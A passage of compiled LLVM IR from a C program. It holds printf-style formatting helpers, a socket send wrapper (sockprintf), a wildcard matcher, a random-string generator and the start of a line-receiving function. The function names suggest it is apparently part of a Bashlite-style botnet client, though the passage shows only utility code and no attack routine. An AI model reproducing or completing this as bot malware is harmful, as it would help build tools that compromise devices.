  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.73, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #9
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #9
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
